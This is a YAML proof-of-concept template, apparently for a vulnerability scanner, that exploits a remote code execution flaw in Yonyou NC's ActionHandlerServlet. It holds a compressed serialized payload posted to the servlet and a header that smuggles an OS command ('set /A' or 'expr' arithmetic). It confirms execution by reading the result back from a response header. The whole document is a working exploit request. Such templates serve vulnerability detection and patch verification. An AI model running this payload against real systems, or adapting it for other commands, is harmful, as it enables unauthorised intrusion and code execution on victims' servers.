name: poc-yaml-yongyou-nc-actionhandlerservlet-rce
binding: c81e0d3b-9751-4050-ad7c-9b1a24a4df73
manual: true
detail:
    links:
        - https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ
    vulnerability:
        level: critical
transport: http
set:
    rInt1: randomInt(800000000, 1000000000)
    rInt2: randomInt(800000000, 1000000000)
    rb: b"\x1f\x8b\b\x00\x00\x00\x00\x00\x00\x00\x9dXyt\x1cu\x1d\xff\xfc\xf6\x9a\xd9\xcd&M\xb6M\xda\xa1\x1cR\xa1$\x95\xec\xc6\xb6i\xe8\x86#Ii\xcb\xca6\x84nh\x9b\x06\r\x93\xddI2tvf;3\x9bn\xaa\x02\"\xa2\x82\aj\x15Z\x04\x14\x81\xa8\x14\xa4\xa0\x9bB-6\"\x82 \bxpy\xa0>\xde\xf3=\xf5\x0f\x9e\xfe\x81\x8f\xa3~\x7f3\x9bf7\xd9Rt_\xb23\xf3\xbd\xef\xefog\xff?\xe1\xb7L4\\)\x8f\xcb\xd1\xbc\xadj\xd1\x8bdkl\x93\x9c\xf3\v\xafL?\xd6t\xc5\xf3^x6 \xa4\x19rf\x83\x9c\xb6\r3\x81\xa0=f*\xd6\x98\xa1e\n\xb9\v\xba\xc0?\xe1]\"}\xd7\xd3?#a\xab\rs4*\xe7\xe4\xf4\x98\x12M\x1b\xd9\xac\xa1[t\xd54%m\xab\xfc~\x8721.ky%\xda\xaf*\x19R\xb5^\xb7\xcd\x89\x1b\xee{\xe1\xd6\xb5\xd3\xa7\xbd\xea\x81'\t/\x91\xd8\x88$\xb9U1M\xd6Gc\x97\f_I\xec\x9d\x84\xca\xca9\x1b\v\\\x1478F\x12:\v\x04\x03\xa9^q\x02\xd5\xc4\x1cM\xca\xbb'\x88G\x7f}\xcf\xb5\xb7O\xd4\xef\xf1\x82%!\x8c8\xce\x91\xd2\xb3\x93$\"\xe6\x8a\x88\x95D\xc4\xcaD\xc4\xfaMY\xb7F\f3\xab\x98\xa4\x96t\xc6O\xa0s$\xafs\xd9Vt\xdd\x98\xac\xeaJ\xa6L@\xdb\x137\xff\xa3y\xf7\xcd>\x0f\xd8 j\xd52\x8ce\xa3u\xf0\x7f3%o\x96X\xde\xcb\x98r\x96\xc3[V\xbc\xf1\xd2\xea%{=@!G\xb9\xf3\x903\x9d\xef\xdb\x19z\xb2e\xdd.\x13\xb8m\xfc\xa6\x86n\xcf\x81=\x1e\x1e\xd1\xa0:C\xb1\x13W\xc1[\xc8\x8d\x9b\xe8 \x89Q+\xafG\xcb\x94\x14d\xcaoT\xd5m\xc5\xd4e-Z\xb04;\x1d\xb5M\xb9@\xa6vo\xdb\xa0j\x84\xc0\xec\xc7\x89\xf8\xf9\xef\xd7\xc8\x84k\x81*\xdbJ\x99\x9d\xabo\xfc\xf7\xd5w]\xff\\'\x95\xda \xfcj\xb79J\xd1^88\xbf\xda\x06Q\xa3\xf6\xc9\xa6\x9c\xed\x9f\xc8)D\x13)\xa7Y\xa7\xc9\x96\xe5\x86\xbd\xc4\x1b\xe5\xf0h\x89\xf7\xa6g\xb7\xddQo\xb5h3\xc1\xe5\x8d\xd12\xcf\xefrw\x95lN#C\xad\x04]\x83[/\x99\xd6\xf7\xdf\xbb\xca\v!\x81\xda!U\xcf(\xba\xdd\x9b\xcf\x0e+\xd4\x80uC6wFS\xec\x04\xc1\vI\xd4\f\xc9\xf9\x82c\x0f\xb7rEy\xd98jb\x8e\x9a\x98\x99\xa7Pd\x95\x18\xefp[\x1e\xd6\x14r044<a+i#\xc39\xbd\x83\x83=\x83\b\f\xa5\xb9(\x9e\xb6\xc6$\xfcC\xba\x9cU*\x9b1e\x9b\xaa>J\xcd\xd80d\xe4\xed\\\xde\xee3\x8d\x9cb\xda*\x17\xd2T\xd6\x9a\xb3\xf0N'\b8J\x1f\x1e1\xae\xe9\xe2w\xa4\xc6\xd1\xd1W;\x8eE\x88\xe0\x9e\xc1\x9e\xfd\xffZ\xfcf@\xec\x7f\xad\x04\xae{\xe3\xa9w\x1fy\x94\xd0+\xf1\xd7\x10\xbcX \xe0\x8f\x02\"\f\x81sU]\xb5\xcfg\xf06\xb7la\xf0\xad#\x1f\x18\r\x06j17P\xfd\xdcEF\x86\x1biY\xdb\"\x9b*\x7f.\x01}\xf6\x98j1,L\xd9\xf9\xe1\xfeR0\xfb\xe4\t>\xe6\x18\xc2\t]W\xccR<\x19\xda\x93\x13\x96a)\xc4\xaf\xc5r.\x8d\xe5\xba\xb7Q\xce\x8c*\xb6uF\x15)\x9d\f\xa1\x94\x917\xd3\n\x950)\f\x97h\xa3<8a\xf8\xe0\x17\xb0\x90a\xd5\xff!\x9a\xa1~n\xa52\x9cv\x02A\f\xe2\xb9i\xad\x14\xb12\xfe~\x9a\xe5rF@#Cm:o\x9aTf.\x88aQsKr.ag\x18\x8b\xb1$\x84&H\fu$\xd8\x05o4\x8d|\x8eA\xaa\xc2\xe1\xa0\x88m)N\xe6l\xa7\x90!\xc4\xe6\x04\x97\xe2_\xc1\xe0vT\x18\xa7\xe1\x03<\xd3\xa73\b\xb6#\xc3\x12\xf1AJ\xed\x1cJ\x01g\x92+$\xecB\x85\n\xd6T2\x1bTE#\xbb[\x9b\xe7\x97j\xb9\x1aS\x19\xe1\x93\"\xe6\x90\x93\xba\xb3\xd0\x1c\xc2r\xb40,\x9bO\xd4\x9dN+\x96\xa5R\xd1\xb8\x91\x16\xf0!\x8a\x94\xa5\xd8\xb3\b\xaa\xa6\xe6\xed-[\xc2hE4\x84\xb3\x11cX|\x1cm\x02>L\xf5J&3,o\x9e?oZ\xe6\x83\xc2X\x85\xd5!*\xfevV9\xa2J\xf9\x10\xd0Aa\"\x89\xbd\xd4\xa5ssVr>\x8c\xb5\x88\xf3\xe0SQ\xfa\x94\x82\x92\x16q^E\x11\xb8t\x02.\xa0\xe4\xa4\r\xdd\xa65E\xc9YZn!\xed.3\xa5\xec\xcc+zZ\xe9l\xd9\x1eF7zB\xe8\xc2:\x129f\xdb9\x11\xeb\xa9%m\xd9$SDl\xa4\xb6\x9b\xe5\xdd\x9c\xd7u\xdev\x02\x12\x9c\x86:\xef\x8c6\x11\x17\x93\xddc\xb2\x9e\xd1\x14S\xc4&\x86Sg\x19z\x8dT>=\xe6Dl}!\xad\xe4\xf8T\x17p\t\x05\x9e\xa4\xa7\xf24R\x9c\t\x15\xc6\xa5\xbcR\x96c3\x89\x1d\xd5\x8caY\x13\xd1O\x8d\x973\r\x9e\x1c\xda\x00\"h4\xd4\xcd\x0e\xa4\xa4jQ\n\xb7\x91\xd1\x96\xba[qfG\"\x8c\xed\x18\xac\xc1\x00.ghlN\x1c'\t\x1f\xe3\x14C\xc4a*;E\xc8\f5d\xcbf\xc5\xca\xd1\xc2QD\xa4\x19\x82\x04\xd8\xa4\xd8c\x06\xd5`W\x95\x1a\x9c\xbf<\xaaU\xa5+\x81T*\x18\xe1\xbe\x8d2,9\x1e\x95\x00\x95<W\xf5qc\a\xf9\xb2\xb6JEUYjU\xfd\xdb\x01-\x84+\x91u\xbd\xb8\x88*\x8bg\xc5\xa0\xb9\xb5\xad\xb5\xbf\xed\xe2\xf5\xbd\xad\x89\xde\r\x94\xb4\x9d\x944\xd5Z\x9f\xcd\xd9\x13N\xf0\xa8\x10,\xd8\xbc\x10\xf2\xc4Jm\x91\xb2e;Oa\xdf\xc5\xdc3\xa5\xab'A\xeb}T1\x05\x10\x97\xaf\x7f\xa0\x8fj\xa5\xa1J\xe3\x7f\x1c\x9f\bb7>\xc9;*\xc1;\xca\x87\xabC\x04\xb8\x86\xb4\x1aV\x94/\"\x11\xd7V\x96\xee\x84e+Y\x01\xd7\xb9\t)-\x9c\x899\xfdUe\n\x1c\xeb\x8d\xeb\xf1\xd9\x10>\x83\xcf\x91\x00\xdbH\x1a\xbbh\xf2\xcb\x96\x12\xc6\r\xbcg\xbap#Ex\x17\xed_\x83\x8e\xb8_$;\xd2\xd9L\x94zH\xc4\x97\x19<1j\xa5\xaf\x1006\xac\xea1kL\xc4\xd7\b\xd8J\xc0\xaf\xcf\xb8\xefT]*-\xf3\x8d\"\xe0\xe6\x8ad\xf6\xb9e\xda\x93W\xb5\f\xc7\xeeehj\x1e\xacb\xb6\x13\x89[C\xd8\x87o2:\xaeS\x97\xd9\xbcT\xcb\xdd)\xc9\"\x7fn\xc7\x1d\x9c\xf2[\x15\t(\xa1\x05\xdc\xe9\x8e\xed\x84N[\x9b\xc4+2\xa5|\xf1\x8c$\xd5\x88\x95!H\xd6]\xb8;\x84\xef\xe0\x1e2\xbb\xb9*\x89k\xdawC\xb8\x05\xdf#\xd7/\xef\x16q/\x15M\xdeR.T45\xab\xd2\xe1\x8d\xe1\xac\xe3\xa7\xa2<<\xa4\xef>\xdc\xcfE\xfd\x80\n@W\nv\x18\ax\x12n\xc1\x83\xee\xd6\xe8\xa1\xa3\x8a\xc5\x8b\xa3e\xb0'\x8c\x1f\xe2G<AEVq\xea\xb7\x8dlZ\xb6\xdd\x9f2\xfcX\x93\x8eRnds\"\xdaCY]\xb3Z\xc4A\xca\x17\x9d\x03\xddyy\xe6\t\xaad\xa62\x1f\xc1!\xde\x8c?&\xdfh\x02\x92\xd8\x19i\x8f2~f\x11p\xc4-\xff\x99\xce\xf9)))u\x8e\x88\x9f\xf1d\x1d/\xad?\xe7><Aim\x1e\xecq!\xbf\xe0\x90\xa7h\xa5\xcf\x1d\x88n\xd3\x97M\xc4_\xd2Np\x0e\x9e\xbajDypz\xf2##\\\xfd\xb3\x14\xa4]\xa6LS\xf99*\x83\xb2\x15\xe9\x8a\b\xe3\x05w\xb8\xfc\x9a\xcc\xcc\x18[M\xca\x93\x88\xdf\x96\xa4\xb9*\xcb\xd4\xbcH\xf6W]\xeb\x02^\x9e\xb3\x95J\xae\tx\x95\x865\xcd\x82\xf4\x0e\xfa\xa5U:s\x95\x1dQ\xfavQ\xbeW\xaejko\xefX\xdb\xb1z\xed\x9as\xda:\xda\xda\x18NO\x9e\x80\x84\x16X\xec\x04\x87\xdb\xeea\x8bN\xc7i{\xe6\xd0$\xe0\xb5\x10\xfe\x8c\x058\x1d\x1e\xba\xf2\x0f\xfd>\xe1\a0\xfa\x0e\xd0S\x8c\xae\x8c\xae\xfe\x15S\xf8\xcb\x01\a-\xd0w\xc0\x01\xb6\x83\xff\xb0\r\xbb\x04\b\xe2Ot\x15\xb1h\x86\xd9\x17G\b\x12\xe0]:\t/Kz\xcf;\x88\x93\x8a8\xb5\xb7\xb5\x88e\x913\x8aX\x11\xf7I>_\x11m\x92\x8f@k\x8e\xe0\x9c\xb8\xdf\xbb&\xd0\x18\x90\xfc\x8f\xde\xe9yM\xf27\x06V\xc6\x05I`\xf7 0\xe9yJ\x12\x8a87.Jb\xe4\xfc\".\xdc\x87Z\xba\xdb\xe0\xdc\x11v?\xc7.\x8b\\T!\x95\xc3\xd6\xc4\x83Rp\x1a\x1fq\xa8\xae\x97\x82\x9c*YI\x15,QqT\xaf\x83\x9a\xc4I\xf1\x90\x03(\"E\x7f\xc7\xc0\xdejL\x9c\xe0\xb2\x12\xc1\xa2x\x8d+\xe8\xb2\xf7\xe2\x88l\x9do\xc1\x11\f\xc4\xc3\xde5\xb5\x8d\xb5R\xf8a|\x94\xd10z\\\n7\xd6>\x8c+<\x88\xd7Iu\x9co\xb8\x92\xaf\x8e\x8b\\ -\xe0\xa8\x8c\xf70\x96\x171&-\xa0\x1bo\x11z\xbc\xdeE\xe4|\x84\x18\xf0F\xbaR\x0e\x96\x9e\xbc\xf4d\xd2\x93~\x04]<\xa0\xecn\xd4Hb\x11\xe3{)H\xacG\xaa\xe7l\x05\x97\xedA\\\xe5\xf0\xd5\xbb|\x87\xb0{\xa0\x01ON\xe1S\x9c\x7fk\xe4\xd3\a\xf1\xf9\"\xbe\x10\xf9\x12%b/\xa4\xc0at\x91\xf0\x9bR\x03\xbe\xc8WS\x03~ILM\xa2\xa9\x04\xdd\xc3\xa1\xdfp\xa1\xf1\x86C\xb8e\xe0\x10\xf6\rH\rS\xb8\xad\x88o\x1719\x85\xefG\xf6\x17\xf1@\x11\x0f\x151\x15\x8fD\x1e>\x88\xc3\xf1\x85\xd2\xc2\xc8OJ>Ls[\x98k\x8a\x14\xe1&\xc4\x17\xb9\xe6>\xe6\x9f\xf1\x92\x94\xb8\xae\xd6\xfbK&w\rD\x1e\x9f\xc2\x93\x84\xe1\xf7\xd2\xa2#\x98\x9e\xc2\xd3\x8e\x03\x93\xb84\xde\x18\xf9\x15\xd7\xd3$5E\x9e/\xd3\xf3\x1b\xa9\xa9BQ\xd0U\xf4;\x97Dj*\x0f\x8b\x14,I\xf3\xfa\xce;\x99G\x11\xc1\xebj\xd9\xe4\xbb\xed\xee\xc3\xa2I\xd4\xc4\x17O\xf2[\\\x17`\x93\xef\x9c:\t1\xbe\x84\xc8\x0fP\xb3\xdc\x85\a\xf0\x10\xfa\xf02\xfe\x86\xbf\xa3\xcf\xd3\xe1\xd9\xe7\xb9\r\xcf\xa0\xdd\xcb\xbc>\xbc\x04\xbf7\xe2m\xa4+\xc3\x1f\xa8\xc1^\xc7R\xefQ\xb4P\x1b\xfa\x99\x80W\x04\xac\x14p\x0eu\xe0\xdbX,\xa0\xe9m\x9c$\xa0\xcb\xf36\xce\x14\xe0U\x05\xf45]A_\xf5G\xa9\x91\xeb*\x18\x88\x96\b\x89\b$i\x80\xf8\xdf\xc5U\xf4\xe4\xfey\xdeB\xdff\x01\xbf?J{~\xe1{\xb1\x1d\xe3 b\x01\xd3 \xc03oa\xd3\x7f\xc0\x02o\xc2\x1f8\xea\x8c\x8b\n;\xe9\xfe%_\x158\xfc\x1c\xe8\xe1\xb3\x83S\xd0]\xad3m\xeaPC\xd7\x109\xefA=]\x839\x1b>\x1a\x7ff\x8e\x0eQ\x05\xfaQ\x1c)\x7f\xbd\xe0n\xa4{\x9b^\xbc\xff\xe9g\xb6\x1f{u\xc3\xc6M\x9c\xc2\x89\n\xd1BV\x8b\xda3/;f\xdf*T\xbeC\xe1?\xeeQzy\x87c/\xefP(pD\xa0\xf0_1c\xa3\x90\x16\x14\x00\x00"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /servlet/~ic/com.ufida.zior.console.ActionHandlerServlet
            headers:
                Content-Type: multipart/form-data;
                X-T0KEN-INF0: set /A {{rInt1}}+{{rInt2}}
            body: |
                {{rb}}
            follow_redirects: false
        expression: |
            "X-T0KEN" in response.headers && response.headers["X-T0KEN"].contains(base64(string(rInt1 + rInt2)))
    r1:
        request:
            cache: true
            method: POST
            path: /servlet/~ic/com.ufida.zior.console.ActionHandlerServlet
            headers:
                Content-Type: multipart/form-data;
                X-T0KEN-INF0: expr {{rInt1}}+{{rInt2}}
            body: |
                {{rb}}
            follow_redirects: false
        expression: |
            "X-T0KEN" in response.headers && response.headers["X-T0KEN"].contains(base64(string(rInt1 + rInt2)))
expression: r0() || r1()
